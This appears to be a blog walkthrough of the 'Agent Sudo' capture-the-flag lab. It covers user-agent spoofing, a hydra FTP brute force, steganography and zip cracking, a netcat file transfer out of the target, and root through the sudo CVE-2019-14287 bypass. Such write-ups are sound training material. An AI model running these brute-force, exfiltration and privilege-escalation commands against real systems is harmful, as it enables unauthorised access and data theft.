## Enumerate cont'd

- To redirect to the secret page, we need to modify the **user-agent** using cURL. I used the command ```curl -A <useragent> 10.10.137.85 -L``` and trying *R* as a user agent shows this.

![Image showing result of R](/blog/agentsudopics/useragentcurl.png 'Fig.1')

- When we try C we get this

![Image showing result of C](/blog/agentsudopics/chris.png 'Fig.2')

- Now we know his name is chris and that his password is weak (not actually weak)

## Hash cracking and brute-force

- I cracked the FTP Password using this command ```hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.194.92 -V```

![Image showing ftp cracked](/blog/agentsudopics/ftpcracked.png 'Fig.3')

- Next is logging into the ftp server with ```ftp user@ip```. Inside we find a txt file that reads

```txt:Text Editor
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- Lets also ```get``` the other images. Inside *cutie.png*, we find a zip file (binwalk'ed) that is password protected.

```bash:Terminal
â”Œâ”€â”€(vipinã‰¿vipin)-[~/Downloads]
â””â”€$ zip2john 8702.zip > 8702.hash

Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Inside the zip file was a txt file named *To_agentR.txt* which says this

```txt:Text Editor
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- It seem like the text is in base64

```bash:Terminal
â”Œâ”€â”€(vipinã‰¿vipin)-[~/Downloads]
â””â”€$ echo 'QXJlYTUx' | base64 -d
Area51           
```

- Now that we have the steg password lets extract text the other image

```bash:Terminal
â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ steghide --extract -p Area51 -sf cute-alien.jpg
wrote extracted data to "message.txt".

â”Œâ”€â”€(vipinã‰¿vipin)-[~]
â””â”€$ cat message.txt                                                                   
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- Thats a LOT of information, enough to get us to the next section.

## Capture the user flag

```bash:Terminal

```

- Now for the next question, utilizing netcat I transfered the file to my vm

```bash:Terminal
james@agent-sudo:~$ nc -w 5 10.6.22.229 6969 < /home/james/Alien_autospy.jpg

# on another window

â”Œâ”€â”€(vipinã‰¿vipin)-[~/Desktop]
â””â”€$ nc -lvnp 6969 > Alien_autopsy.jpg
```

- Now using google search, we find this various results but no fox news, but using the other articles I learned that some guy named Roswell faked an alien autopsy which gives us the answer *roswell alien autopsy*.

## Privilege escalation

> it's the most wonderful time of the Machine

- We start by running ```find / -uid 0 -perm -4000 -type f 2>/dev/null``` to find exploitable SUID Binaries and sudo seems to be one.

```bash:Terminal
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

- A little searching find us [this](https://www.exploit-db.com/exploits/47502) exploit which tells us the CVE (CVE-2019-14287) & how to privilege escalate!

```bash:Terminal
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt
